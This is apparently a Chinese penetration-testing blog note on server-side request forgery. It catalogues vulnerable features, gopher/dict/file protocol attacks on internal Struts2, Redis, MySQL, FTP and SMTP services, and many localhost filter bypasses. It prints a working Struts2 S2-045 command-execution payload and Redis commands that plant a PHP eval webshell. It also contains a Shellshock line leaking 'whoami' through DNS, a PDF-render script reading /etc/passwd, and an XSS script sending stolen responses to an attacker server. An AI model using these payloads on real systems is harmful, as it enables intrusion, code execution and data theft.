---
title: Ssrf
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-06T15:59:03+08:00
categories: 
- 渗透测试
- 外网漏洞
---

# SSRF

## SSRF简介

攻击者在未获得服务器权限的情况下，将域中不安全的服务器作为代理使用，通过该服务器直接发送请求给所在内网，一般针对外网无法访问的内部系统

SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载

## SSRF通常的存在位置

1.社交分享功能：获取超链接的标题等内容进行显示

2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览

3.在线翻译：给网址翻译对应网页的内容

4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片

5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验

6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试

7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作

8.数据库内置功能：数据库的比如mongodb的copyDatabase函数

9.邮件系统：比如接收邮件服务器地址

10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等

11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞

一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……

12.从远程服务器请求资源（upload from url 如discuz！；import & expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）

## SSRF利用

### http://协议

由于过滤不严格，我们可以通过超链接请求到内网资源

```
eg:
http://xxx.com?url=.......用于请求资源
---->
http://xxx.com?url=http://127.0.0.1/flag.php
请求到服务端上的flag.php内容
```

### dict://协议

通常用于端口扫描

```
http://xxx.com?url=dict://127.0.0.1:port
```

### file://协议

```
http://xxx.com?url=file://var/www/html/flag.php
```

需要有文件的绝对路径

### Ldap

```
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

### Gopher协议

Gopher 是一种应用层协议，它提供提取和查看存储在远程 Web 服务器上的 Web 文档的能力。当它问世时，它是为在 IP 网络中分发、搜索和检索文档而设计的。Gopher类似于FTP,因为它通过 TCP/IP 互联网络（如 Internet）远程访问文件。但是，虽然一个 FTP 站点只存在于一台服务器上并且可以有许多不同的 FTP 站点，但实际上只有一个分布式 Gopher 文件系统。

**协议格式**

```
gopher://<host>:<port>/<gopher-path>
<port> -->默认为70
<gopher-path> -->
				<gophertype><selector>
				<gophertype><selector>%09<search>
				<gophertype><selector>%09<search>%09<gopher+_string>
```

#### 攻击内网web服务

```
测试环境
192.168.121.140存在struts2 s2-045漏洞,该漏洞通过gopher 协议提交位于header 内的poc 来完成rce。
192.168.121.135与该机器存在于同一内网中且存在ssrf漏洞
```

通过doker拉一个镜像到目标机上

后端ssrf.php

```php
<?php
$url = $_GET['url'];
$curlobj = curl_init($url);
curl_setopt($curlobj, CURLOPT_HEADER, 0);
curl_exec($curlobj);
?>
```

```
poc:
GET /showcase.action HTTP/1.1
Host: 192.168.123.140:8080
Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

两次url编码在ssrf.php?url处请求即能看到回显

#### 攻击内网redis

传统的利用redis未授权漏洞写入shell的流程

```
redis-cli -h 192.168.121.138
192.168.121.138:6379>config set dir /var/www/html 
192.168.121.138:6379>config set dbfilename shell.php 
192.168.121.138:6379> set shell "\r\n<?php @eval($_POST['1']);?>\r\n
192.168.121.138:6379>save
```

使用tcpdump对网卡进行回环抓包，并将完整数据写入a.cap

```
tcpdump -i lo port 6379 -s 0 -w a.cap
```

打开wireshark追踪写码过程的数据流，并以与原始数据报错到a.txt,利用下面的命令对a.txt进行编码

```
cat a.txt|xxd -plain|sed -r 's/(..)/%\1/g'|tr -d '\n'
```

然后使用gopher协议发送到6379端口，完成手写操作，也可以直接使用工具生成攻击redis的gopher协议

#### 攻击mysql

当遇到mysql无密码或者是不需要密码就可以进行登陆的时候，我们可以利用gopher攻击mysql

内容基本上与攻击redis一致，但需要注意gopher攻击mysql时不一定能够看到回显，我们通常需要拿一个webshell，所以基本上是通过select into outfile和udf进行提权

将追踪的原始数据改为一行用如下脚本进行编码；

```python
#encoding:utf-8

def result(s):
	a=[s[i:i+2] for i in xrange(0,len(s),2)]
	return "curl gopher://127.0.0.1:3306/_%" + "%".join(a)

if __name__ == '__main__':
	import sys
	s=sys.argv[1]
	print result(s)
```

#### 攻击内网ftp

ftp 只能通过tcp 连接，gopher 协议支持ftp 操作，利用gopher 可以暴破ftp 的账号密码，暴破完了之后可以尝试上传文件。

**What is ftp**

FTP（File Transfer Protocol）是一种用于在计算机网络上进行文件传输的标准协议。它允许用户通过网络在不同的计算机之间传输文件，包括文本、图像、音频、视频等各种类型的文件。

FTP协议工作方式是通过客户端和服务器之间的交互来完成文件传输。客户端通过FTP客户端软件连接到服务器，然后使用FTP协议命令来传输文件。FTP协议支持两种模式：ASCII模式和二进制模式。在ASCII模式下，文件以ASCII字符集传输，适用于文本文件；而在二进制模式下，文件以字节流方式传输，适用于非文本文件。

**How to attack**

利用gopher 可以暴破ftp 的账号密码，暴破完了之后可以尝试上传文件。

fit格式

```
ftp://{username}:{password}@{host}:{port}/{path}
```

```
tcpdump -i lo -s 0 -w ~/ftp.cap
curl ftp://root:root@127.0.0.1/
```

模拟一边原始数据，并以原始数据的形式保存下来，

```
USER root
PASS root
QUIT
```

这里只保存这几个

```shell
cat 1|sed 's/ /%20/g'|sed ':a;N;s/\n/%0d%0a/;ta;'|sed -r 's/(.*)/gopher:\/\/192.168.73.130:21\/_\1/g'|sed 's/%/%25/g'|sed 's/:/%3a/g'
```

将拿到的包url编码两次，就可以用bp进行爆破了

#### SMTP in Gopher

SMTP是一种简单的邮件服务，但是SMTP并不支持http，因此通常使用gopher协议走私到smtp

返回连接到1337

```
文件位于 xxx.com/redirect.php:
<?php
header("Location: gopher://listenner_ip:1337/_SSRF%0ATest!");
?>
```

发送邮件

```php
Content of xxx.com/redirect.php:
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

简要使用

```
http://test.com?url=http://xxx.com/redirect.php
```

## SSRF Bypass

#### for localhost

```python
#localhost
http://localhost:80
#127.0.0.1
http://127.0.0.1:80
#0.0.0.1
http://0.0.0.0:80
```

#### 绕过filter

**using https**

```
http:// --> https://127.0.0.1:80
```

**使用[::]绕过localhost限制**

```
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid
```

**域名重定向**

```
localh.st	--> 			   127.0.0.1
spoofed.[BURP_COLLABORATOR]		127.0.0.1
spoofed.redacted.oastify.com	127.0.0.1
company.127.0.0.1.nip.io	    127.0.0.1
```

nip.io 是一个专门用于本地开发和测试的 DNS 服务。它提供了一个简单的方式来将任何 IP 地址映射到一个可访问的域名上，这个域名的格式为 {IP 地址}.nip.io。

**通过CIDR绕过localhost限制**

CIDR（Classless Inter-Domain Routing，无类域间路由选择）是一种用于分配和管理 IP 地址的标准方法。它是在IPv4地址耗尽的情况下引入的，以更有效地使用现有的IP地址空间。

例如，一个 CIDR 前缀可以表示为一个 IP 地址加上一个斜线（/）和一个数字，如 192.168.1.0/24，其中 /24表示网络前缀有 24 位，即前三个字节。这意味着这个网络可以容纳 2^8（256）个主机，因为最后一个字节留给主机地址。

```
ip address from 127.0.0.1/8
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

**使用10进制IP位置绕过**

```
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
http://2852039166/ = http://169.254.169.254
```

**使用8进制IP绕过**

```
http://0177.0.0.1/ = http://127.0.0.1
http://o177.0.0.1/ = http://127.0.0.1
http://0o177.0.0.1/ = http://127.0.0.1
http://q177.0.0.1/ = http://127.0.0.1
...
```

https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdfs

**使用 IPv6/IPv4 地址嵌入绕过**

```
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[::ffff:127.0.0.1]
```

**使用格式错误的网址进行绕过**

```
localhost:+11211aaa
localhost:00011211aaaa
```

**短IP地址进行绕过**

```
http://127.0.1
http://0/
http://127.1
可绕过对IP地址进行限制的情况
```

**对url进行编码绕过**

```
http://127.0.0.1/admin
--> 
http://127.0.0.1/%61dmin
-->
http://127.0.0.1/%2561dmin
```

**使用bash变量进行绕过（curl only）**

```
curl -v "http://uu2fu3o$ssrf.com" $ssrf = ""
```

**使用技巧组合绕过**

```python
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
#该url地址具有&@#不同的特殊符号不同的Python网络库对这个URL的解析结果如下
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3
```

**使用全角字符数字进行绕过**

```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com

List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

**unicode**

某些语言像python3和.NET仍然支持unicode

**绕过filter_var() php函数**

```php
filter_var()是PHP中用于过滤和验证数据的函数之一，它可以对一个变量进行指定的过滤处理，并返回过滤后的结果。
filter_var()函数的基本语法如下：
filter_var($variable, $filter, $options);
其中：
$variable：需要过滤的变量。
$filter：指定的过滤器类型，可以是预定义的常量或者自定义的过滤器函数。
$options：可选参数，用于指定一些额外的选项，例如过滤器的参数等。
filter_var()函数支持多种不同的过滤器类型，包括过滤输入、过滤输出、过滤验证等多种类型。一些常用的过滤器类型和对应的预定义常量如下：
FILTER_VALIDATE_EMAIL：验证一个邮件地址。
FILTER_VALIDATE_IP：验证一个IP地址。
FILTER_VALIDATE_URL：验证一个URL。
FILTER_SANITIZE_STRING：去除字符串中的非法字符。
FILTER_SANITIZE_NUMBER_INT：去除字符串中的非数字字符。
FILTER_SANITIZE_SPECIAL_CHARS：将字符串中的HTML特殊字符转换为实体。
```

```php
<?php
$url = '0://evil.com:80;http://google.com:80/';
if (filter_var($url, FILTER_VALIDATE_URL)) {
    echo '这是一个合法的URL地址。';
} else {
    echo '这不是一个合法的URL地址。';
}
?>
//php filter_var.php
//这是一个合法的URL地址。
```

**绕过弱解析器**

```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

![WeakParser](C:\Users\86199\Pictures\WeakParser.jpg)

https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf

**重定向**

创建一个重定向页面，使该页面定向到需要的目标

```php
<?php
header('Location: http://127.0.0.1/');
exit;
?>
```

**使用 type=url 绕过**

将type=file改为type=url

上传图片url造成的ssrf

**DNS重绑定**

https://lock.cmpxchg8b.com/rebinder.html

**使用jar协议绕过（仅限java）**

```java
jar:scheme://domain/path!/ 
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/
```

## Blind SSRF

**what is bindssrf**

当可以诱导应用程序向提供的 URL 发出后端 HTTP 请求，但后端请求的响应未在应用程序的前端响应中返回时，就会出现盲目 SSRF 漏洞。

**How to check**

我们可以利用brup，当然也有很多其他外带工具，我们可以通过brup的Collaborator模块进行外带，更改请求包中的referer字段为子域，观察模块中是否能接收到请求，如果目标主机对此有请求，则可以说明这里存在一个bind ssrf

**How to use**

如果利用ssrf是一个比较复杂的问题，如果我们对目标所持有的信息很少，则需要我们进行不断地猜测，这里给出一个示范

```
User-Agent: (){foo;}; /usr/bin/nslookup $(whoami).domain
referer: http://192.168.0.$x$:$080$
尝试拿到一个rce
```

https://github.com/assetnote/blind-ssrf-chains

## PDF SSRF

```xml
Example with PhantomJS

<script>
    exfil = new XMLHttpRequest();
    exfil.open("GET","file:///etc/passwd");
    exfil.send();
    exfil.onload = function(){document.write(this.responseText);}
    exfil.onerror = function(){document.write('failed!')}
</script>
```

通常产生自能够导出PDF，且能够嵌入html标签的位置。如果能从访问外部，可以加载外部的恶意文件

https://www.jomar.fr/posts/2021/ssrf_through_pdf_generation/

## SSRF and XSS

### ssrf to xss

jira集成网络环境中的漏洞，可以试着寻找具有以下特点的url

```
jira/plugins/servlet/oauth/users/icon-uri?consumerUri=
```

```
http://brutelogic.com.br/poc.svg   -->simple xss
假设有一SSRF站点
http://xxx.com?url=   --> 存在ssrf
http://xxx.com?url=http://brutelogic.com.br/poc.svg  -->ssrf to xss
```

### ssrf from xss

配合xss漏洞进行ssrf，可用于读取页面以及提交表单等操作

```js
var formData = new FormData();
formData.append("username","uu2");
formData.append("pass","uu2");
//你要提交的表单内容，视情况而定
var request = new XMLHttpReauest();
request.onload = SendBack();
request.open("POST","http://xxx.com/",true);//通过true设置异步
request.withCredentials = true;
request.send(formData);//发送表单

function SendBack(){
	location= 'http://ur_vps_ip:port/result?result=' + btoa(this.responseText); //将得到的内容发送回vps并base64编码
}
```

https://www.youtube.com/watch?v=htDzTiqgZs8

能够导出PDF，使用iframe标签进行添加

```xml
<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
```

## 参考链接

https://paper.seebug.org/510/

https://www.youtube.com/watch?v=o6AJH9PFEd4&t=5s

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md#http

